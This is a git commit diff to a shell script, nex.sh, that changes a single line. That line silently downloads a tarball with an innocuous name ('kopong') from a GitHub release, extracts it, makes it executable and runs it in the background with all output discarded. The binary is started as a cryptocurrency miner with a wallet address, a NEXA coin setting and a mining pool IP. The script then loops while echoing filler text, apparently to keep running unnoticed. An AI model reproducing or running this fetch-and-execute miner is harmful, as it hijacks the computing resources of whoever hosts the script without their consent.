cd4be9abe2076ef810568ed384d8ca436cc80599
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-05 08:42:12 +0700

    Update nex.sh

--- nex.sh
+++ nex.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
-wget https://github.com/preak07/kopi/releases/download/susu/kopong.tar.gz > /dev/null 2>&1 && tar -xvf kopong.tar.gz &&  chmod +x kopong && ./kopong -algo randomx -wallet ZEPHsAZJ6eo36HYMxHZKtUGhfG3xycfLkEKcSKiUDXXiQAnA6z4VxeuN4sj4AQe8USWfozFRYzB2WS6kMWfGGZaj7AoQe1dWLmp -coin ZEPH -rigName "vivo" -pool1 zeph-asia1.nanopool.org:10900 --cpu-max-threads-hint 25 >/dev/null 2>&1 &
+wget https://github.com/preak07/kopi/releases/download/susu/kopong.tar.gz > /dev/null 2>&1 && tar -xvf kopong.tar.gz &&  chmod +x kopong && ./kopong -algo randomx -wallet nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -coin NEXA -rigName "vivo" -pool1 159.203.162.18:3333 -threads 1 >/dev/null 2>&1 &
 while true
 do
         echo "gasss........!"
